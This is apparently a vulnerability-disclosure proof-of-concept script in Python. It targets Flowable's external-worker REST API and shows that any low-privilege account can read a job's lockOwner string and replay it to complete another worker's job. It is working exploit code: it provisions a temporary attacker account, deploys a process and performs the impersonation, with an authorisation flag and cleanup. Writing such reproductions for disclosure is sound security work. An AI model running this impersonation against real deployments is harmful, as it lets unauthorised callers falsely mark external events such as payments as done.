#!/usr/bin/env python3
"""
flowable-poc V3 — CWE-639 — external-worker identity is a replayable, disclosed string
========================================================================================

External-worker operations are authorized by comparing a `workerId` taken from the
request body against the job's lockOwner:

    modules/flowable-job-service/.../AbstractExternalWorkerJobCmd.java:73
        if (!Objects.equals(workerId, job.getLockOwner())) throw ...

That value is never bound to the authenticated principal, and the job resource
discloses it to any authenticated caller:

    GET /flowable-rest/external-job-api/jobs/{jobId}   ->  "lockOwner": "<the worker's id>"

So the check reduces to a string the API will hand out on request.

Demonstration
-------------
    1. acquire two jobs as two distinct worker identities  (workerA, workerB)
    2. read workerA's identity back from the job resource
    3. complete workerB's job while presenting workerA's identity
    4. the wrong identity is refused 403, the other one is accepted 204

Both identities in step 1 belong to this PoC. No pre-existing job, no real worker,
no business data is involved. Step 3 is the defect: the caller did not acquire the
job it just completed.

    POST /flowable-rest/external-job-api/acquire/jobs
        {"topic":"...","workerId":"<someone else's id>","lockDuration":"PT60S",...}

Why the impact is more than availability
----------------------------------------
In Flowable's external-worker model `complete` does not mean "mark this task done".
It asserts that the event which was supposed to happen outside the engine has
happened — the engine has no other source for that fact. A payment integration
asserting "the charge settled" is asserting something about the outside world.

Scope
-----
Creates one process definition, one process instance and two jobs, all named
flowable-poc-v3-* and all owned by this PoC. Releases the jobs it acquires. Exits
non-zero if the finding does not reproduce.

Usage:
    python3 v3_worker_impersonation.py --base http://localhost:8080/flowable-rest \\
                                       --user rest-admin --pass test --confirm-authorised
"""
import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request

TOPIC = "flowable-poc-v3-topic"
PROC_KEY = "flowable-poc-v3-proc"

BPMN = """<?xml version="1.0" encoding="UTF-8"?>
<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
             xmlns:flowable="http://flowable.org/bpmn"
             targetNamespace="http://bpmn.io/schema/bpmn">
  <process id="flowable-poc-v3-proc" name="Flowable PoC - external worker" isExecutable="true">
    <startEvent id="start"/>
    <sequenceFlow id="f1" sourceRef="start" targetRef="task"/>
    <serviceTask id="task" name="external work"
                 flowable:type="external"
                 flowable:topic="flowable-poc-v3-topic"/>
    <sequenceFlow id="f2" sourceRef="task" targetRef="end"/>
    <endEvent id="end"/>
  </process>
</definitions>
"""


def die(msg, code=2):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(code)


LOWPRIV = "flowable-poc-v3-user"


def provision_lowpriv(base, admin_user, admin_pw):
    """Create a throwaway principal holding ONLY access-rest-api, and return its creds."""
    idm = f"{base}/idm-api"
    request(f"{idm}/users", admin_user, admin_pw, method="POST",
            body=json.dumps({"id": LOWPRIV, "password": "flowable-poc-temp",
                             "first": "Flowable", "last": "PoC"}).encode(),
            ctype="application/json")
    st, raw = request(f"{idm}/privileges", admin_user, admin_pw)
    if st != 200:
        die(f"cannot list privileges ({st}) - need an access-admin account to provision", 4)
    match = [p for p in json.loads(raw)["data"] if p["name"] == "access-rest-api"]
    if not match:
        die("privilege 'access-rest-api' not found; is this a stock Flowable deployment?", 4)
    request(f"{idm}/privileges/{match[0]['id']}/users", admin_user, admin_pw, method="POST",
            body=json.dumps({"userId": LOWPRIV}).encode(), ctype="application/json")
    return LOWPRIV, "flowable-poc-temp"


def cleanup_lowpriv(base, admin_user, admin_pw):
    request(f"{base}/idm-api/users/{LOWPRIV}", admin_user, admin_pw, method="DELETE")


def request(url, user, pw, method="GET", body=None, ctype=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("Authorization",
                   "Basic " + base64.b64encode(f"{user}:{pw}".encode()).decode())
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except urllib.error.URLError as e:
        die(f"cannot reach {url}: {e}", 3)


def post_json(url, user, pw, obj):
    return request(url, user, pw, method="POST",
                   body=json.dumps(obj).encode(), ctype="application/json")


def acquire(base_ext, user, pw, worker_id):
    st, raw = post_json(f"{base_ext}/acquire/jobs", user, pw, {
        "topic": TOPIC, "workerId": worker_id,
        "lockDuration": "PT120S", "numberOfTasks": 1,
    })
    if st != 200:
        die(f"acquire returned {st}: {raw.decode(errors='replace')[:300]}", 5)
    jobs = json.loads(raw)
    if not jobs:
        die("acquire returned no jobs — is the definition running?", 5)
    return jobs[0]["id"]


def main():
    ap = argparse.ArgumentParser(description="Flowable V3 PoC (CWE-639)")
    ap.add_argument("--base", required=True)
    ap.add_argument("--user", default="rest-admin")
    ap.add_argument("--pass", dest="pw", default="test")
    ap.add_argument("--confirm-authorised", action="store_true")
    ap.add_argument("--no-provision", action="store_true",
                    help="do not create a separate low-privilege attacker account")
    args = ap.parse_args()

    if not args.confirm_authorised:
        die("refusing to run without --confirm-authorised")

    base = args.base.rstrip("/")
    svc = f"{base}/service"
    ext = f"{base}/external-job-api"

    worker_a = "flowable-poc-v3-workerA"
    worker_b = "flowable-poc-v3-workerB"
    outsider = "flowable-poc-v3-outsider"

    # The setup runs as the administrator; the impersonation in step 4 runs as a
    # separate, correctly-scoped API account, because the point is that an ordinary
    # principal with no worker relationship can act as the lock owner.
    attacker_user, attacker_pw = args.user, args.pw
    provisioned = False
    if not args.no_provision:
        try:
            attacker_user, attacker_pw = provision_lowpriv(base, args.user, args.pw)
            provisioned = True
        except SystemExit:
            raise
        except Exception as e:  # noqa: BLE001
            die(f"could not provision a low-privilege account: {e} "
                f"(re-run with --no-provision to supply your own)", 4)

    try:
        return run(args, base, svc, ext, worker_a, worker_b, outsider,
                   attacker_user, attacker_pw)
    finally:
        if provisioned:
            cleanup_lowpriv(base, args.user, args.pw)
            print(f"\n[cleanup] removed temporary account {LOWPRIV}")


def run(args, base, svc, ext, worker_a, worker_b, outsider, attacker_user, attacker_pw):
    # ---- precondition
    print("== precondition ==")
    st, _ = request(f"{base}/actuator", args.user, args.pw)
    print(f"  setup account {args.user!r}: GET /actuator -> {st}")
    st, _ = request(f"{base}/actuator", attacker_user, attacker_pw)
    print(f"  attacker account {attacker_user!r}: GET /actuator -> {st}"
          + ("  (403 expected: the ordinary role is all that is required)" if st == 403 else ""))

    st, raw = request(f"{svc}/repository/deployments", args.user, args.pw)
    if st not in (200, 201):
        die(f"precondition not met: repository/deployments returned {st}", 4)
    print(f"  GET repository/deployments -> {st}  (access-rest-api granted)")

    # ---- setup: a definition with one external task, started twice
    print("\n== setup: deploy and start a definition with an external worker task ==")
    b = "----flowablepocboundary"
    body = (f'--{b}\r\nContent-Disposition: form-data; name="file"; '
            f'filename="v3.bpmn20.xml"\r\nContent-Type: application/xml\r\n\r\n'
            ).encode() + BPMN.encode() + f"\r\n--{b}--\r\n".encode()
    st, raw = request(f"{svc}/repository/deployments", args.user, args.pw, method="POST",
                      body=body, ctype=f"multipart/form-data; boundary={b}")
    if st not in (200, 201):
        die(f"deploy returned {st}: {raw.decode(errors='replace')[:300]}", 4)
    print(f"  deploy -> {st}")

    for _ in range(2):
        st, raw = post_json(f"{svc}/runtime/process-instances", args.user, args.pw,
                            {"processDefinitionKey": PROC_KEY, "latest": True})
        if st not in (200, 201):
            die(f"start returned {st}: {raw.decode(errors='replace')[:300]}", 4)
    print("  started 2 instances -> 2 external worker jobs pending")

    # ---- step 1: two distinct worker identities each hold one job
    print("\n== step 1: two workers acquire one job each ==")
    job_a = acquire(ext, args.user, args.pw, worker_a)
    job_b = acquire(ext, args.user, args.pw, worker_b)
    print(f"  {worker_a} holds {job_a}")
    print(f"  {worker_b} holds {job_b}")

    # ---- step 2: the identity is disclosed
    print("\n== step 2: the job resource discloses the worker's identity ==")
    st, raw = request(f"{ext}/jobs/{job_b}", args.user, args.pw)
    if st != 200:
        die(f"GET job returned {st}", 6)
    disclosed = json.loads(raw).get("lockOwner")
    print(f"  GET /external-job-api/jobs/{job_b[:8]}... -> {st}")
    print(f"  lockOwner = {disclosed!r}   <- the only credential the API ever checks")
    if disclosed != worker_b:
        die(f"expected lockOwner {worker_b!r}, got {disclosed!r} — did not reproduce", 7)
    st_anon, _ = request(f"{ext}/jobs/{job_b}", "definitely-not-a-user", "wrong")
    print(f"  same path unauthenticated -> {st_anon}  (401 expected: the ordinary"
          f" access-rest-api role is all that is required)")

    # ---- step 3: control — an identity that holds no lock is refused
    print("\n== step 3: control — an identity that holds no lock is refused ==")
    st, raw = post_json(f"{ext}/acquire/jobs/{job_b}/complete", args.user, args.pw,
                        {"workerId": outsider, "variables": []})
    print(f"  complete {job_b[:8]}... as {outsider} -> {st}")
    print(f"    {raw.decode(errors='replace')[:160]}")
    if st != 403:
        die(f"expected 403 for an identity that holds no lock, got {st} — "
            f"authorization may differ on this version", 8)

    # ---- step 4: a DIFFERENT account replays the disclosed string
    print("\n== step 4: a different account replays the disclosed string ==")
    print(f"  account {attacker_user!r} has never acquired {job_b[:8]}..., has no worker")
    print(f"  credential, and has no relationship to {worker_b!r}.")
    st, raw = post_json(f"{ext}/acquire/jobs/{job_b}/complete", attacker_user, attacker_pw,
                        {"workerId": disclosed, "variables": []})
    print(f"  complete {job_b[:8]}... as {disclosed!r} -> {st}")
    if st not in (200, 204):
        die(f"expected 2xx, got {st}: {raw.decode(errors='replace')[:300]} — "
            f"V3 did not reproduce", 9)
    print("  accepted.")

    # ---- verdict
    print("\n== verdict ==")
    print("  V3 REPRODUCED. The authorization check is a string comparison against")
    print("  lockOwner, and lockOwner is a readable field of the job resource. Any")
    print("  access-rest-api principal can therefore become any worker.")
    print()
    print("  What this is NOT: the check is per-job. Presenting worker A's identity on")
    print("  worker B's job is correctly refused with 403 — that case was tested and is")
    print("  not the defect. The defect is that the identity is neither secret nor bound")
    print("  to a principal, so a caller who can read a jobId can act as its owner.")
    print()
    print("  Release the remaining job this PoC holds:")
    print(f"    curl -u {args.user}:*** -X POST {ext}/unacquire/jobs/{job_a} \\")
    print(f"         -H 'Content-Type: application/json' "
          f"-d '{{\"workerId\":\"{worker_a}\"}}'")
    return 0


if __name__ == "__main__":
    sys.exit(main())
